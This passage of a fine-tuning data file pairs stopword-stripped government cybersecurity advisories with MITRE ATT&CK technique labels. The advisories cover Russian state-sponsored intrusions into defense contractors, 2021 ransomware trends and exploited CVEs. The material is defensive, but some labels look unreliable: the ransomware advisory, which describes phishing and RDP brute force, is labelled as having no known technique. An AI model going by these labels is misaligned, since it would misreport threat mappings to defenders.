cyber security incident ncscgovukreportanincident monitored 24 hrs urgent assistance call 03000 200 973 revisions february 23 2022 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: No known technique detected"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary actions help protect russian statesponsored malicious cyber activity enforce multifactor authentication enforce strong unique passwords enable m365 unified audit logs implement endpoint detection response tools least january 2020 february 2022 federal bureau investigation fbi national security agency nsa cybersecurity infrastructure security agency cisa observed regular targeting us cleared defense contractors cdcs russian statesponsored cyber actors actors targeted large small cdcs subcontractors varying levels cybersecurity protocols resources cdcs support contracts us department defense dod intelligence community following areas command control communications combat systems intelligence surveillance reconnaissance targeting weapons missile development vehicle aircraft design software development data analytics computers logistics historically russian statesponsored cyber actors used common effective tactics gain access target networks including spearphishing credential harvesting brute forcepassword spray techniques known vulnerability exploitation accounts networks weak security actors take advantage simple passwords unpatched systems unsuspecting employees gain initial access moving laterally network establish persistence exfiltrate data many attempted compromises actors employed similar tactics gain access enterprise cloud networks prioritizing efforts widely used microsoft 365 m365 environment actors often maintain persistence using legitimate credentials variety malware exfiltrating emails data continued intrusions enabled actors acquire sensitive unclassified information well cdcproprietary exportcontrolled technology acquired information provides significant insight us weapons platforms development deployment timelines vehicle specifications plans communications infrastructure information technology acquiring proprietary internal documents email communications adversaries may able adjust military plans priorities hasten technological development efforts inform foreign policymakers us intentions target potential sources recruitment given sensitivity information widely available unclassified cdc networks fbi nsa cisa anticipate russian statesponsored cyber actors continue target cdcs us defense information near future agencies encourage cdcs apply recommended mitigations advisory regardless evidence compromise additional information russian statesponsored cyber activity see cisas webpage russia cyber threat overview advisories click pdf version report threat details targeted industries assessed motive russian statesponsored cyber actors targeted us cdcs least january 2020 february 2022 actors leverage access cdc networks obtain sensitive data us defense intelligence programs capabilities compromised entities included cdcs supporting us army us air force us navy us space force dod intelligence programs twoyear period actors maintained persistent access multiple cdc networks cases least six months instances actors successfully obtained access fbi nsa cisa noted regular recurring exfiltration emails data example compromise 2021 threat actors exfiltrated hundreds documents related companys products relationships countries internal personnel legal matters intrusions threat actors acquired unclassified cdcproprietary exportcontrolled information theft granted actors significant insight us weapons platforms development deployment timelines plans communications infrastructure specific technologies employed us government military although many contract awards descriptions publicly accessible program developments internal company communications remain sensitive unclassified emails among employees government customers often contain proprietary details technological scientific research addition program updates funding statuses see figures 1 2 information targeted customers industries information figure 1 targeted industries figure 2 exfiltrated information threat actor activity note advisory uses mitre attck enterprise framework version 10 see attck enterprise referenced threat actor tactics techniques see tactics techniques procedures ttps section table threat actors activity mapped mitre attck tactics techniques initial access russian statesponsored cyber actors use brute force methods spearphishing harvested credentials known vulnerabilities gain initial access cdc networks threat actors use brute force techniques identify valid account credentials domain m365 accounts obtaining domain credentials actors use gain initial access networks note information see joint nsafbicisa cybersecurity advisory russian gru conducting global brute force campaign compromise enterprise cloud environments threat actors send spearphishing emails links malicious domains use publicly available url shortening services mask link embedding shortened urls instead actorcontrolled malicious domains obfuscation technique meant bypass virus spam scanning tools technique often promotes false legitimacy email recipient increasing probability victims clicking link threat actors use harvested credentials conjunction known vulnerabilitiesfor example cve20200688 cve202017144on publicfacing applications virtual private networks vpns escalate privileges gain remote code execution rce exposed applications1 addition threat actors exploited cve201813379 forticlient obtain credentials access networks cdcs find patch known vulnerabilities networks actors alter tradecraft seek new means access activity necessitates cdcs maintain constant vigilance software vulnerabilities outofdate security configurations especially internetfacing systems credential access gaining access networks threat actors map active directory ad connect domain controllers exfiltrate credentials export copies ad database ntdsdit multiple instances threat actors used mimikatz dump admin credentials domain controllers collection using compromised m365 credentials including global admin accounts threat actors gain access m365 resources including sharepoint pages user profiles user emails command control threat actors routinely use virtual private servers vpss encrypted proxy actors use vpss well small office home office soho devices operational nodes evade detection persistence multiple instances threat actors maintained persistent access least six months although actors used variety malware maintain persistence fbi nsa cisa also observed intrusions rely malware persistence mechanisms cases likely threat actors relied possession legitimate credentials persistence enabling pivot accounts needed maintain access compromised environments tactics techniques procedures following table maps observed russian statesponsored cyber activity mitre attck enterprise framework several techniques listed table based observed procedures contextual order therefore tactics techniques listed respective columns appear see appendix functional breakdown ttps note specific countermeasures related attck technique see enterprise mitigations section mitre d3fend table 1 observed tactics techniques procedures ttps detection fbi nsa cisa urge cdcs investigate suspicious activity enterprise cloud environments note additional approaches uncovering malicious cyber activity see joint advisory technical approaches uncovering remediating malicious activity authored cisa cybersecurity authorities australia canada new zealand united kingdom detect unusual activity implement robust log collection retention robust logging critical detecting unusual activity without centralized log collection monitoring capability organizations limited ability investigate incidents detect threat actor behavior described advisory depending environment tools solutions include cloud native solutions cloudnative security incident event management siem tools thirdparty tools sparrow review microsoft cloud environments detect unusual activity service principals application activity note guidance using detection tools refer cisa cybersecurity advisory detecting postcompromise threat activity microsoft cloud environments look evidence known ttps look behavioral evidence network hostbased artifacts known ttps associated activity detect password spray activity review authentication logs system application login failures valid accounts look frequent failed authentication attempts across multiple accounts detect use compromised credentials combination vps follow steps review logs suspicious impossible logins logins changing usernames user agent strings ip address combinations logins ip addresses align expected users geographic location look one ip used multiple accounts excluding expected logins search impossible travel occurs user logs multiple ip addresses significant geographic distance apart ie person could realistically travel geographic locations two ip addresses time logins note detection opportunity result false positives legitimate users apply vpn solutions connecting networks evaluate processes program execution commandline arguments may indicate credential dumping especially attempts access copy ntdsdit file domain controller identify suspicious privileged account use resetting passwords applying user account mitigations review logs unusual activity typically dormant accounts look unusual user agent strings strings typically associated normal user activity may indicate bot activity incident response remediation organizations evidence compromise assume full identity compromise initiate full identity reset reset passwords local accounts accounts include guest helpassistant defaultaccount system administrator krbtgt essential reset password krbtgt account account responsible handling kerberos ticket requests well encrypting signing note reset krbtgt account twice consecutively 10hour waiting period resets ie perform first krbtgt password reset wait 10 hours follow second krbtgt password reset krbtgt password resets may take long time propagate fully large ad environments refer microsofts ad forest recovery resetting krbtgt password guidance automation script additional information45 reset domain user admin service account passwords note guidance evicting advanced persistent threat apt actors cloud enterprise environments refer cisa analysis report eviction guidance networks affected solarwinds active directorymicrosoft 365 m365 compromise although guidance drafted federal agencies compromised russian foreign intelligence service svr via solarwinds orion supply chain compromise steps provided eviction phase applicable organizations crafting eviction plans suspected apt actors mitigations fbi nsa cisa encourage cdcs without evidence compromise apply following mitigations reduce risk compromise threat actor mitigations intended allencompassing address common ttps observed intrusions help mitigate common malicious activity implement credential hardening enable multifactor authentication enable multifactor authentication mfa users without exception subsequent authentication may require mfa enabling possibility bypass mfa reusing single factor authentication assertions eg kerberos authentication reducing lifetime assertions cause account revalidation mfa requirements6 service accounts use mfa automation platform features eg group managed service accounts gmsa provide automatic periodic complex password management service accounts reducing threat surface single factor authentication assertions7 enforce strong unique passwords require accounts strong unique passwords passwords reused across multiple accounts stored system adversary may access enable password management functions local administrator password solution laps local administrative accounts reduce burden users managing passwords encourage strong passwords introduce account lockout timebased access features implement timeout lockout features response repeated failed login attempts configure timebased access accounts set admin level higher example justintime jit access method provisions privileged access needed support enforcement principle least privilege well zero trust model process networkwide policy set place automatically disable administrator accounts ad level account direct need account needed individual users submit requests automated process enables access system set timeframe support task completion reduce credential exposure use virtualization solutions modern hardware software ensure credentials securely stored protect credentials via capabilities windows defender credential guard credguard trusted platform module tpm8 protecting domain credentials credguard requires configuration limitations protecting types credentials eg wdigest local accounts910 credguard uses tpms protect stored credentials tpms function system integrity observer trust anchor ensuring integrity boot sequence mechanisms eg uefi secure boot installation windows 11 requires tpm v2011 disabling wdigest rolling expiring ntlm secrets smartcards protect credentials protected credguard1213 establish centralized log management create centralized log management system centralized logging applications allow network defenders look anomalous activity outofplace communications devices unaccountable login failures network environment forward logs siem tool ensure logs searchable retain critical historic network activity logs minimum 180 days using m365 enable unified audit log ualm365s logging capabilitywhich contains events exchange online sharepoint online onedrive azure ad microsoft teams powerbi m365 services correlate logs including m365 logs network host security devices correlation help detecting anomalous activity network environment connecting potential anomalous activity m365 addition setting centralized logging organizations ensure powershell logging turned threat actors often use powershell hide malicious activities14 update powershell instances version 50 later uninstall earlier versions powershell logs prior versions either nonexistent record enough detail aid enterprise monitoring incident response activities confirm powershell 50 instances module script block transcription logging enabled monitor remote accessremote desktop protocol rdp logs disable unused remote accessrdp ports initiate software patch management program consider using centralized patch management system failure deploy software patches timely manner makes organization target opportunity increasing risk compromise organizations ensure timely patching software vulnerabilities implementing enterprisewide software patch management program15 organization unable update software shortly patch released prioritize patches cves already known exploited would accessible largest number potential adversaries internetfacing systems subscribe cisa cybersecurity notifications advisories keep known exploited vulnerabilities security updates threats assist organizations maintaining situational awareness critical software vulnerabilities applicable associated exploitation sign cisas cyber hygiene services including vulnerability scanning help reduce exposure threats cisas vulnerability scanning service evaluates external network presence executing continuous scans public static ips accessible services vulnerabilities employ antivirus programs ensure antivirus applications installed organizations computers configured prevent spyware adware malware part operating system security baseline keep virus definitions date regularly monitor antivirus scans use endpoint detection response tools utilize endpoint detection response edr tools tools allow high degree visibility security status endpoints effective defense threat actors edr tools particularly useful detecting lateral movement insight common uncommon network connections host maintain rigorous configuration management programs audit configuration management programs ensure track mitigate emerging threats review system configurations misconfigurations security weaknesses robust configuration program hinders sophisticated threat operations limiting effectiveness opportunistic attacks16 enforce principle least privilege apply principle least privilege administrator accounts minimum permissions need tasks reduce impact administrator account compromised m365 assign administrator roles rolebased access control rbac implement principle least privilege given high level default privilege use global administrator account absolutely necessary using azure ads numerous builtin administrator roles instead global administrator account limit assigning unnecessary privileges note refer microsoft documentation azure ad builtin roles information azure ad remove privileges expressly required accounts function role ensure unique distinct administrative accounts set administrative tasks create nonprivileged accounts privileged users ensure use non privileged accounts nonprivileged access eg web browsing email access reduce number domain enterprise administrator accounts remove accounts unnecessary regularly audit administrative user accounts regularly audit logs ensure new accounts legitimate users institute group policy disables remote interactive logins use domain protected users group assist identifying suspicious behavior administrative accounts create privileged role tracking create change control process privilege escalations role changes user accounts enable alerts privilege escalations role changes log privileged user changes network environment create alert unusual events review trust relationships review existing trust relationships service providers managed service providers msps cloud service providers csps threat actors known exploit trust relationships providers customers gain access customer networks data remove unnecessary trust relationships review contractual relationships service providers ensure contracts include security controls customer deems appropriate appropriate monitoring logging providermanaged customer systems appropriate monitoring service providers presence activities connections customer network notification confirmed suspected security events incidents occurring providers infrastructure administrative networks note review cisas page apts targeting service provider customers cisa insights mitigations hardening guidance msps small midsized businesses additional recommendations msp csp customers encourage remote work environment best practices increase remote work use vpn services due covid19 fbi nsa cisa encourage regularly monitoring remote network traffic along employing following best practices note additional information see joint nsacisa cybersecurity information sheet selecting hardening remote access vpn solutions regularly update vpns network infrastructure devices devices used remote work environments latest software patches security configurations possible require mfa vpn connections physical security tokens secure form mfa followed authenticator applications mfa unavailable mandate employees engaging remote work use strong passwords monitor network traffic unapproved unexpected protocols reduce potential attack surfaces discontinuing unused vpn servers may used point entry adversaries establish user awareness best practices cyber actors frequently use unsophisticated methods gain initial access often mitigated stronger employee awareness indicators malicious activity fbi nsa cisa recommend following best practices improve employee operational security conducting business provide end user awareness training help prevent targeted social engineering spearphishing scams ensure employees stakeholders aware potential cyber threats delivered also provide users training information security principles techniques inform employees risks social engineering attacks eg risks associated posting detailed career information social professional networking sites ensure employees aware contact see suspicious activity suspect cyber intrusion help quickly efficiently identify threats employ mitigation strategies apply additional best practice mitigations deny atypical inbound activity known anonymization services including commercial vpn services onion router tor impose listing policies applications remote access allow systems execute known permitted programs established security policy identify create offline backups critical assets implement network segmentation review cisa alert aa20120a microsoft office 365 security recommendations additional recommendations hardening m365 cloud environments rewards justice program information statesponsored russian cyber operations targeting us critical infrastructure contact department states rewards justice program may eligible reward 10 million department offering information leading identification location person acting direction control foreign government participates malicious cyber activity us critical infrastructure violation computer fraud abuse act cfaa contact 202 7027843 whatsapp signal telegram send information via rewards justice secure torbased tips line located dark web details refer rewardsforjusticenet caveats information accessed received provided informational purposes fbi nsa cisa endorse commercial product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring fbi nsa cisa contact information report suspicious activity related information found joint cybersecurity advisory contact local fbi field office wwwfbigovcontactusfieldoffices fbis 247 cyber watch cywatch 855 2923937 email cywatchfbigov available please include following information regarding incident date time location incident type activity number people affected type equipment used activity name submitting company organization designated point contact request incident response resources technical assistance related threats contact cisa centralcisagov nsa client requirements general cybersecurity inquiries contact nsa cybersecurity requirements center 410 8544200 cybersecurityrequestsnsagov defense industrial base companies may additionally sign nsas free cybersecurity services including protective dns vulnerability scanning threat intelligence collaboration dibdefensecybernsagov appendix detailed tactics techniques procedures reconnaissance reconnaissance consists techniques involve adversaries actively passively gathering information used support targeting adversary known harvesting login credentials17 initial access initial access consists techniques use various entry vectors gain initial foothold within network example adversary may obtain abuse credentials existing accounts means gaining initial access persistence privilege escalation defense evasion18 specific actors obtained abused credentials domain cloud accounts19 actors also used external remote services gain access systems20 adversary took advantage weaknesses internetfacing servers conducted sql injection attacks organizations external websites21 finally sent spearphishing emails malicious link attempt gain access22 persistence persistence consists techniques adversaries use keep access systems across restarts changed credentials interruptions could cut access adversary obtains abuses credentials existing accounts means gaining initial access persistence privilege escalation defense evasion23 privilege escalation privilege escalation consists techniques adversaries use gain higherlevel permissions system network adversary obtains abuses credentials existing accounts means gaining initial access persistence privilege escalation defense evasion24 specifically case credentials cloud accounts obtained abused25 defense evasion defense evasion consists techniques adversaries use avoid detection throughout compromise adversary made executables files difficult discover analyze encrypting encoding otherwise obfuscating contents system transit26 credential access credential access consists techniques stealing credentials like account names passwords adversary attempted access create copy active directory ad domain database steal credential information well obtain information domain members devices users access rights27the adversary also used single small list commonly used passwords many different accounts attempt acquire valid account credentials28 discovery discovery consists techniques adversary may use gain knowledge system internal network adversary enumerated files directories searched specific locations host network share certain information within file system29 addition adversary attempted gather information domain trust relationships may used identify lateral movement opportunities windows multidomain forest environments30 collection collection consists techniques adversaries may use gather information sources information collected relevant adversarys objectives adversary leverages information repositories sharepoint mine valuable information31 command control command control c2 consists techniques adversaries may use communicate systems control within victim network adversary chained together multiple proxies disguise source malicious traffic case tor vpn servers used multihop proxies route c2 traffic obfuscate activities32 additional resources1nsa cisa fbi ncsc cybersecurity advisory russian gru conducting global brute force campaign compromise enterprise cloud environments 1 july 20212 nsa cybersecurity advisorymitigating recent vpn vulnerabilities7 october 20193 nsa cisa fbi ncsc cybersecurity advisory russian gru conducting global brute force campaign compromise enterprise cloud environments 1 july 20214 microsoft articlead forest recovery resetting krbtgt password29 july 20215 microsoft github newkrbtgtkeysps114 may 20206 nsa cybersecurity informationdefend privileges accountsaugust 20197 microsoft articlegroup managed service accounts overview 29 july 20218 nsa cybersecurity information leverage modern hardware security featuresaugust 20199 microsoft articleprotect derived domain credentials windows defender credential guard 3 december 202110 microsoft articlewindows defender credential guard protection limits 3 december 202111 microsoft articlewindows 11 requirements 30 november 202112 microsoft blog postthe importance kb2871997 kb2928120 credential protection 20 september 202113 microsoft articlewhats new credential protection 7 january 202214 nsa cybersecurity factsheetpowershell security risks defenses 1 december 201615 nsa cybersecurity informationupdate upgrade software immediately august 201916 nsa cybersecurity informationactively manage systems configurations august 201917 mitre groups apt28 18 october 202118 mitre groupsapt28 18 october 202119 mitre softwarecobalt strike 18 october 202120 based technical information shared mandiant21 mitre groupsapt28 18 october 202122 based technical information shared mandiant23 mitre groupsapt28 18 october 202124 mitre groupsapt28 18 october 202125 mitre softwarecobalt strike 18 october 202126 mitre softwarefysbis 6 november 202027 mitre softwarekoadic 30 march 202028 mitre groupsapt28 18 october 202129 based technical information shared mandiant30 based technical information shared mandiant31 mitre groups apt28 18 october 202132 mitre groupsapt28 18 october 2021 revisions february 16 2022 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003.003, T1027, T1078, T1078.002, T1078.004, T1083, T1090.003, T1110, T1110.003, T1114, T1114.002, T1133, T1190, T1213.002, T1482, T1566.002, T1589.001"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary immediate actions take protect ransomware update operating system software implement user training phishing exercises raise awareness risk suspicious links attachments use remote desktop protocol rdp secure monitor make offline backup data use multifactor authentication mfa 2021 cybersecurity authorities united states123 australia4 united kingdom5 observed increase sophisticated highimpact ransomware incidents critical infrastructure organizations globally federal bureau investigation fbi cybersecurity infrastructure security agency cisa national security agency nsa observed incidents involving ransomware 14 16 us critical infrastructure sectors including defense industrial base emergency services food agriculture government facilities information technology sectors australian cyber security centre acsc observed continued ransomware targeting australian critical infrastructure entities including healthcare medical financial services markets higher education research energy sectors united kingdoms national cyber security centre ncscuk recognizes ransomware biggest cyber threat facing united kingdom education one top uk sectors targeted ransomware actors ncscuk also seen attacks targeting businesses charities legal profession public services local government health sectors ransomware tactics techniques continued evolve 2021 demonstrates ransomware threat actors growing technological sophistication increased ransomware threat organizations globally joint cybersecurity advisoryauthored cybersecurity authorities united states australia united kingdomprovides observed behaviors trends well mitigation recommendations help network defenders reduce risk compromise ransomware click pdf version report technical details cybersecurity authorities united states australia united kingdom observed following behaviors trends among cyber criminals 2021 gaining access networks via phishing stolen remote desktop protocols rdp credentials brute force exploiting vulnerabilities phishing emails rdp exploitation exploitation software vulnerabilities remained top three initial infection vectors ransomware incidents 2021 ransomware threat actor gained code execution device network access deploy ransomware note infection vectors likely remain popular increased use remote work schooling starting 2020 continuing 2021 increase expanded remote attack surface left network defenders struggling keep pace routine software patching using cybercriminal servicesforhire market ransomware became increasingly professional 2021 criminal business model ransomware well established addition increased use ransomwareasaservice raas ransomware threat actors employed independent services negotiate payments assist victims making payments arbitrate payment disputes cyber criminals ncscuk observed ransomware threat actors offered victims services 247 help center expedite ransom payment restoration encrypted systems data note cybersecurity authorities united states australia united kingdom assess ransomware criminal business model continues yield financial returns ransomware actors ransomware incidents become frequent every time ransom paid confirms viability financial attractiveness ransomware criminal business model additionally cybersecurity authorities united states australia united kingdom note criminal business model often complicates attribution complex networks developers affiliates freelancers often difficult identify conclusively actors behind ransomware incident sharing victim information eurasian ransomware groups shared victim information diversifying threat targeted organizations example announcing shutdown blackmatter ransomware group transferred existing victims infrastructure owned another group known lockbit 20 october 2021 conti ransomware actors began selling access victims networks enabling followon attacks cyber threat actors shifting away biggame hunting united states first half 2021 cybersecurity authorities united states australia observed ransomware threat actors targeting big game organizationsie perceived highvalue organizations andor provide critical servicesin several highprofile incidents victims included colonial pipeline company jbs foods kaseya limited however ransomware groups suffered disruptions us authorities mid2021 subsequently fbi observed ransomware threat actors redirecting ransomware efforts away biggame toward midsized victims reduce scrutiny acsc observed ransomware continuing target australian organizations sizes including critical services big game throughout 2021 ncscuk observed targeting uk organizations sizes throughout year big game victims overall victims included businesses charities legal profession public services education local government health sectors diversifying approaches extorting money encrypting victim networks ransomware threat actors increasingly used triple extortion threatening 1 publicly release stolen sensitive information 2 disrupt victims internet access andor 3 inform victims partners shareholders suppliers incident acsc continued observe double extortion incidents threat actor uses combination encryption data theft pressure victims pay ransom demands ransomware groups increased impact targeting cloud ransomware developers targeted cloud infrastructures exploit known vulnerabilities cloud applications virtual machine software virtual machine orchestration software ransomware threat actors also targeted cloud accounts cloud application programming interfaces apis data backup storage systems deny access cloud resources encrypt data addition exploiting weaknesses gain direct access threat actors sometimes reach cloud storage systems compromising local onpremises devices moving laterally cloud systems ransomware threat actors also targeted cloud service providers encrypt large amounts customer data targeting managed service providers ransomware threat actors targeted managed service providers msps msps widespread trusted accesses client organizations compromising msp ransomware threat actor could access multiple victims one initial compromise cybersecurity authorities united states australia united kingdom assess increase ransomware incidents threat actors target msps reach clients attacking industrial processes although ransomware incidents critical infrastructure affect business information technology systems fbi observed several ransomware groups developed code designed stop critical infrastructure industrial processes attacking software supply chain globally 2021 ransomware threat actors targeted software supply chain entities subsequently compromise extort customers targeting software supply chains allows ransomware threat actors increase scale attacks accessing multiple victims single initial compromise targeting organizations holidays weekends fbi cisa observed cybercriminals conducting increasingly impactful attacks us entities holidays weekends throughout 2021 ransomware threat actors may view holidays weekendswhen offices normally closedas attractive timeframes fewer network defenders support personnel victim organizations information see joint fbicisa cybersecurity advisory ransomware awareness holidays weekends mitigations cybersecurity authorities united states australia united kingdom recommend network defenders apply following mitigations reduce likelihood impact ransomware incidents keep operating systems software date timely patching one efficient costeffective steps organization take minimize exposure cybersecurity threats regularly check software updates end life eol notifications prioritize patching known exploited vulnerabilities cloud environments ensure virtual machines serverless applications thirdparty libraries also patched regularly usually customers responsibility automate software security scanning testing possible consider upgrading hardware software necessary take advantage vendorprovided virtualization security capabilities use rdp potentially risky services secure monitor closely limit access resources internal networks especially restricting rdp using virtual desktop infrastructure assessing risks rdp deemed operationally necessary restrict originating sources require mfa mitigate credential theft reuse rdp must available externally use virtual private network vpn virtual desktop infrastructure means authenticate secure connection allowing rdp connect internal devices monitor remote accessrdp logs enforce account lockouts specified number attempts block brute force campaigns log rdp login attempts disable unused remote accessrdp ports ensure devices properly configured security features enabled disable ports protocols used business purpose eg rdp transmission control protocol port 3389 restrict server message block smb protocol within network access servers necessary remove disable outdated versions smb ie smb version 1 threat actors use smb propagate malware across organizations review security posture thirdparty vendors interconnected organization ensure connections thirdparty vendors outside software hardware monitored reviewed suspicious activity implement listing policies applications remote access allow systems execute known permitted programs established open document readers protected viewing modes help prevent active content running implement user training program phishing exercises raise awareness among users risks visiting suspicious websites clicking suspicious links opening suspicious attachments reinforce appropriate user response phishing spearphishing emails require mfa many services possibleparticularly webmail vpns accounts access critical systems privileged accounts manage backups require accounts password logins eg service account admin accounts domain admin accounts strong unique passwords passwords reused across multiple accounts stored system adversary may access note devices local admin accounts implement password policy possibly using password management solution eg local administrator password solutionlaps requires strong unique passwords admin account using linux use linux security module selinux apparmor seccomp defense depth security modules may prevent operating system making arbitrary connections effective mitigation strategy ransomware well remote code execution rce protect cloud storage backing multiple locations requiring mfa access encrypting data cloud using cloudbased key management encryption ensure storage key administration roles separated malicious cyber actors use system network discovery techniques network system visibility mapping limit adversarys ability learn organizations enterprise environment move laterally take following actions segment networks network segmentation help prevent spread ransomware controlling traffic flows betweenand access tovarious subnetworks restricting adversary lateral movement organizations international footprint aware connectivity overseas arms expand threat surface organizations implement network segmentation international divisions appropriate example acsc observed ransomware data theft incidents australian divisions multinational companies impacted ransomware incidents affecting assets maintained hosted offshore divisions outside control implement endtoend encryption deploying mutual transport layer security mtls prevent eavesdropping communications turn prevent cyber threat actors gaining insights needed advance ransomware attack identify detect investigate abnormal activity potential traversal indicated ransomware networkmonitoring tool aid detecting ransomware leverage tool logs reports network traffic including lateral movement network endpoint detection response tools particularly useful detecting lateral connections insight unusual network connections host artificial intelligence aienabled network intrusion detection systems nids also able detect block many anomalous behaviors associated early stages ransomware deployment document external remote connections organizations document approved solutions remote management maintenance unapproved solution installed workstation organization investigate immediately solutions legitimate purposes flagged antivirus vendors implement timebased access privileged accounts example justintime access method provisions privileged access needed support enforcement principle least privilege well zero trust model setting networkwide policy automatically disable admin accounts active directory level needed individual users submit requests automated process enables access system set timeframe cloud environments justintime elevation also appropriate may implemented using persession federated claims privileged access management tools enforce principle least privilege authorization policies minimize unnecessary privileges identities consider privileges assigned human identities well nonperson eg software identities cloud environments nonperson identities service accounts roles excessive privileges key vector lateral movement data access account privileges clearly defined narrowly scoped regularly audited usage patterns reduce credential exposure accounts credentials present hosts enable compromise network enforcing credential protectionby restricting accounts credentials used using local device credential protection featuresreduces opportunities threat actors collect credentials lateral movement privilege escalation disable unneeded commandline utilities constrain scripting activities permissions monitor usage privilege escalation lateral movement often depend software utilities run command line threat actors able run tools difficulty escalating privileges andor moving laterally organizations also disable macros sent external sources via group policy maintain offline ie physically disconnected backups data regularly test backup restoration practices safeguard organizations continuity operations least minimize potential downtime attack well protect data losses cloud environments consider leveraging native cloud service provider backup restoration capabilities secure cloud backups consider separation account roles prevent account manages backups used deny degrade backups account become compromised ensure backup data encrypted immutable ie altered deleted covers entire organizations data infrastructure consider storing encryption keys outside cloud cloud backups encrypted using cloud key management service kms could affected cloud environment become compromised collect telemetry cloud environments ensure telemetry cloud environmentsincluding network telemetry eg virtual private cloudvpc flow logs identity telemetry eg account signon token usage federation configuration changes application telemetry eg file downloads crossorganization sharingis retained visible security team note critical infrastructure organizations industrial control systemsoperational technology networks review joint cisafbi cybersecurity advisory darkside ransomware best practices preventing business disruption ransomware attacks recommendations including mitigations reduce risk severe business functional degradation entity fall victim ransomware responding ransomware attacks ransomware incident occurs organization cybersecurity authorities united states australia united kingdom recommend organizations follow ransomware response checklist p 11 cisamultistate information sharing analysis center msisac joint ransomware guide scan backups possible scan backup data antivirus program check free malware performed using isolated trusted system avoid exposing backups potential compromise report incidents respective cybersecurity authorities us organizations report incidents immediately fbi local fbi field office cisa uscertcisagovreport us secret service us secret service field office australian organizations report incidents asds acsc via cybergovau call 1300 292 371 1300 cyber 1 uk organizations report incidents ncscuk via reportncscgovuk andor action fraud united kingdoms fraud cyber reporting centre via actionfraudpoliceuk apply incident response best practices found joint cybersecurity advisory technical approaches uncovering remediating malicious activity developed cisa cybersecurity authorities australia canada new zealand united kingdom note cybersecurity authorities united states australia united kingdom strongly discourage paying ransom criminal actors criminal activity motivated financial gain paying ransom may embolden adversaries target additional organizations retarget organization encourage cyber criminals engage distribution ransomware paying ransom also guarantee victims files recovered additionally reducing financial gain ransomware threat actors help disrupt ransomware criminal business model additionally ncscuk reminds uk organizations paying criminals condoned uk government instances ransom paid victim organizations often cease engagement authorities lose visibility payments made continues prove challenging ncscuk supported uk government efforts identifying needed policy changesincluding measures cyber insurance industry ransom paymentsthat could reduce threat ransomware resources information resources protecting responding ransomware refer stopransomwaregov centralized us wholeofgovernment webpage providing ransomware resources alerts cisas ransomware readiness assessment nocost selfassessment based tiered set practices help organizations better assess well equipped defend recover ransomware incident cisa offers range nocost cyber hygiene services help critical infrastructure organizations assess identify reduce exposure threats including ransomware requesting services organizations size could find ways reduce risk mitigate attack vectors us department states rewards justice rfj program offers reward 10 million reports foreign government malicious activity us critical infrastructure see rfj website information report information securely acsc recommends organizations implement eight essential mitigation strategies acscs strategies mitigate cyber security incidents cybersecurity baseline strategies known essential eight make much harder adversaries compromise systems refer acscs practical guides protect ransomware attacks held ransom cybergovau refer ncscuks guides protect ransomware attacks respond recover ncscgovukransomwarehome disclaimer information report provided informational purposes fbi cisa nsa acsc ncscuk endorse commercial product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation references1 united states federal bureau investigation2 united states cybersecurity infrastructure security agency3 united states national security agency4 australian cyber security centre5 united kingdom national cyber security centre revisions february 9 2022 initial versionfebruary 10 2022 replaced pdf 508 compliant pdf product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: No known technique detected"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary actions critical infrastructure organizations implement immediately strengthen cyber posture patch systems prioritize patching known exploited vulnerabilities implement multifactor authentication use antivirus software develop internal contact lists surge support notethis advisory uses mitre adversarial tactics techniques common knowledge attck framework version 10 see attck enterprise referenced threat actor tactics techniques joint cybersecurity advisory csaauthored cybersecurity infrastructure security agency cisa federal bureau investigation fbi national security agency nsais part continuing cybersecurity mission warn organizations cyber threats help cybersecurity community reduce risk presented threats csaprovides overview russian statesponsored cyber operations commonly observed tactics techniques procedures ttps detection actions incident response guidance mitigations overview intended help cybersecurity community reduce risk presented threats cisa fbi nsa encourage cybersecurity communityespecially critical infrastructure network defendersto adopt heightened state awareness conduct proactive threat hunting outlined detection section additionally cisa fbi nsa strongly urge network defenders implement recommendations listed detailed mitigations section mitigations help organizations improve functional resilience reducing risk compromise severe business degradation prepared confirm reporting processes minimize personnel gaps itot security coverage create maintain exercise cyber incident response plan resilience plan continuity operations plan critical functions operations kept running technology systems disrupted need taken offline enhance organizations cyber posture follow best practices identity access management protective controls architecture vulnerability configuration management increase organizational vigilance stay current reporting threat subscribe cisas mailing list feeds receive notifications cisa releases information security topic threat cisa fbi nsa encourage critical infrastructure organization leaders review cisa insights preparing mitigating cyber threats information reducing cyber threats organization click herefor pdf version report technical details historically russian statesponsored advanced persistent threat apt actors used common effective tacticsincluding spearphishing brute force exploiting known vulnerabilities accounts networks weak securityto gain initial access target networks vulnerabilities known exploited russian statesponsored apt actors initial access include cve201813379 fortigate vpns cve20191653 cisco router cve20192725 oracle weblogic server cve20197609 kibana cve20199670 zimbra software cve201910149 exim simple mail transfer protocol cve201911510 pulse secure cve201919781 citrix cve20200688 microsoft exchange cve20204006 vmware note zeroday time cve20205902 f5 bigip cve202014882 oracle weblogic cve202126855 microsoft exchange note vulnerability frequently observed used conjunction cve202126857 cve202126858 cve202127065 russian statesponsored apt actors also demonstrated sophisticated tradecraft cyber capabilities compromising thirdparty infrastructure compromising thirdparty software developing deploying custom malware actors also demonstrated ability maintain persistent undetected longterm access compromised environmentsincluding cloud environmentsby using legitimate credentials cases russian statesponsored cyber operations critical infrastructure organizations specifically targeted operational technology otindustrial control systems ics networks destructive malware see following advisories alerts information historical russian statesponsored cyberintrusion campaigns customized malware targeted ics ics advisory ics focused malware havex ics alert ongoing sophisticated malware campaign compromising ics update e ics alert cyberattack ukrainian critical infrastructure technical alert crashoverride malware cisa mar hatman safety system targeted malware update b cisa ics advisory schneider electric triconex tricon update b russian statesponsored apt actors used sophisticated cyber capabilities target variety us international critical infrastructure organizations including defense industrial base well healthcare public health energy telecommunications government facilities sectors highprofile 